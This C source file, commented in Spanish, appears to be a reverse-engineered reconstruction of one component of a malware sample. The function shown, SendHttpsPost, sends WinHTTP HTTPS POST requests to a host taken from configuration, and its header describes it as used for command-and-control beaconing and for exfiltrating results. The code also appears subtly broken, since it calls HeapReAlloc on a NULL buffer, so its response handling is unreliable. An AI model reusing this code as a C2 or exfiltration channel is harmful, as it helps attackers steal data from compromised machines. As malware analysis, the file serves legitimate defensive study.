/* ============================================================
 * Capacidad 06/15 — C2 HTTPS y exfiltración
 * Función C : SendHttpsPost
 * Dirección : 0x180009d00   · Nodo N3/N5   · Confianza: Alta
 * ------------------------------------------------------------
 * Transporte de red basado en WinHTTP. Realiza POST HTTPS a la ruta '/'
 * sobre el puerto 443. El host no está fijado en claro: se toma del
 * contexto de ejecución/configuración. Se usa tanto para el beacon de
 * configuración como para la exfiltración de resultados.
 * ============================================================
 */

#include "00_tipos_comunes.h"
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

#define HTTP_READ_CHUNK 0x10000u   /* bloque de lectura de la respuesta */

/* ------------------------------------------------------------------
 * Secuencia WinHTTP observada [confirmado]:
 *   WinHttpOpen -> WinHttpConnect(host,443) -> WinHttpOpenRequest(POST,"/")
 *   -> WinHttpSendRequest -> WinHttpReceiveResponse -> WinHttpReadData
 * La respuesta se acumula en `response` (memoria de heap; el llamador
 * la libera).
 * ------------------------------------------------------------------ */
bool SendHttpsPost(const RemoteEndpoint *ep,
                   const wchar_t *verb, const wchar_t *path,
                   uint16_t port,
                   const ByteBuffer *request, ByteBuffer *response)
{
    if (ep == NULL || ep->host == NULL || request == NULL || response == NULL)
        return false;

    response->data = NULL;
    response->len  = 0;
    response->cap  = 0;

    HINTERNET session = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                    NULL, NULL, 0);
    if (session == NULL)
        return false;

    HINTERNET conn = WinHttpConnect(session, ep->host, port, 0);
    if (conn == NULL) {
        WinHttpCloseHandle(session);
        return false;
    }

    HINTERNET req = WinHttpOpenRequest(conn, verb, path, NULL,
                                       WINHTTP_NO_REFERER,
                                       WINHTTP_DEFAULT_ACCEPT_TYPES,
                                       WINHTTP_FLAG_SECURE);   /* HTTPS */
    if (req == NULL) {
        WinHttpCloseHandle(conn);
        WinHttpCloseHandle(session);
        return false;
    }

    BOOL ok = WinHttpSendRequest(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                 request->data, (DWORD)request->len,
                                 (DWORD)request->len, 0);
    if (ok)
        ok = WinHttpReceiveResponse(req, NULL);

    /* Lectura acumulativa de la respuesta. */
    if (ok) {
        size_t   total = 0;
        uint8_t *buf   = NULL;

        for (;;) {
            DWORD avail = 0;
            if (!WinHttpQueryDataAvailable(req, &avail) || avail == 0)
                break;

            size_t need = total + avail;
            uint8_t *grown = (uint8_t *)HeapReAlloc(GetProcessHeap(), 0, buf, need);
            if (grown == NULL)
                break;
            buf = grown;

            DWORD read = 0;
            if (!WinHttpReadData(req, buf + total, avail, &read) || read == 0)
                break;
            total += read;
        }

        response->data = buf;
        response->len  = total;
        response->cap  = total;
    }

    WinHttpCloseHandle(req);
    WinHttpCloseHandle(conn);
    WinHttpCloseHandle(session);
    return response->len != 0;
}
